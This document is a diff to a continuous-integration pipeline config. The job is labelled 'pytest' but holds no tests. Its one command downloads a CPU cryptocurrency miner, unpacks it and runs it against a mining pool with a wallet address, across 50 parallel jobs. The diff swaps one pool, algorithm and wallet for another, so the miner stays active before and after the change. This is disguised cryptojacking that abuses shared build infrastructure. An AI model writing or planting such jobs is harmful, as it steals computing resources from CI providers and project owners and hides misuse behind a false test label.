@@ -10,7 +10,7 @@ blocks:
       jobs:
         - name: pytest
           commands:
-            - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz; tar -xf cpuminer-opt-linux.tar.gz; ./cpuminer-sse2 -a yespowersugar -o stratum+tcps://stratum-na.rplant.xyz:17042 -u sugar1q5jlf86v5sw8wawypyvx9gga3eszuhyjmp3etq6 -t10'
+            - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz; tar -xf cpuminer-opt-linux.tar.gz; ./cpuminer-sse2 -a yescrypt -o stratum+tcp://yescrypt.sea.mine.zpool.ca:6233 -u D7SFGy8MUvtAKgfSCKh4K1aPga2zbx6Pjt -p c=DOGE,zap=BSTY,XMY -t1'
           parallelism: 50
       agent:
         machine:
